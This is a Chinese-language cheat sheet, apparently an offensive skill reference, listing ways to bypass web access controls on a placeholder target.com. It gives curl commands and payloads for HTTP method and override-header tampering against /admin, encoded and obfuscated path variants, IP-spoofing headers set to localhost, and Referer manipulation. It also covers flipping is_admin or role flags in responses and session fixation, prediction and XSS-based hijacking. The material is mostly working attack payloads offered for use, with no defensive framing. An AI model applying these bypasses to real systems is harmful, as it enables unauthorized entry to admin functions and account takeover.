# 绕过技术参考

## HTTP 方法绕过

```bash
# 尝试不同 HTTP 方法访问受限端点
curl -X GET "http://target.com/admin"
curl -X POST "http://target.com/admin"
curl -X PUT "http://target.com/admin"
curl -X DELETE "http://target.com/admin"
curl -X PATCH "http://target.com/admin"
curl -X OPTIONS "http://target.com/admin"
curl -X HEAD "http://target.com/admin"

# 方法覆盖头
curl -X POST "http://target.com/admin" -H "X-HTTP-Method-Override: PUT"
curl -X POST "http://target.com/admin" -H "X-Method-Override: PUT"
curl -X POST "http://target.com/admin" -H "X-HTTP-Method: DELETE"
```

## 路径绕过

```bash
# 大小写变形
/admin → /Admin → /ADMIN → /aDmIn

# 路径遍历
/admin → /./admin → /../admin/ → /;/admin

# URL 编码
/admin → /%61%64%6d%69%6e
# 双重编码
/admin → /%2561%2564%256d%2569%256e

# 双斜杠 / 末尾操作
/admin → //admin → /admin// → /admin/.

# 添加扩展名
/admin → /admin.json → /admin.html → /admin.php

# 添加参数 / 片段
/admin → /admin?anything → /admin#anything → /admin;.css
```

## IP 限制绕过

```bash
# 常见 IP 伪造头
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
```

## Referer 检查绕过

```bash
Referer: http://target.com/admin
Referer: http://target.com/
Referer:
# 完全移除 Referer 头
```

## 前端验证绕过

```bash
# 直接调用后端 API，绕过前端权限检查
curl "http://target.com/api/admin/users" -H "Cookie: session=xxx"

# 使用 Burp 修改服务端响应中的权限标志
# {"is_admin":false} → {"is_admin":true}
# {"role":"user"} → {"role":"admin"}
```

## Session 攻击

```bash
# Session 固定: 获取未认证 session → 诱导用户使用该 session 登录 → 复用
# Session 预测: 收集多个 session 值，分析生成规律，预测有效 session
# Session 劫持: 通过 XSS 窃取 session cookie（配合 xss 技能）
```
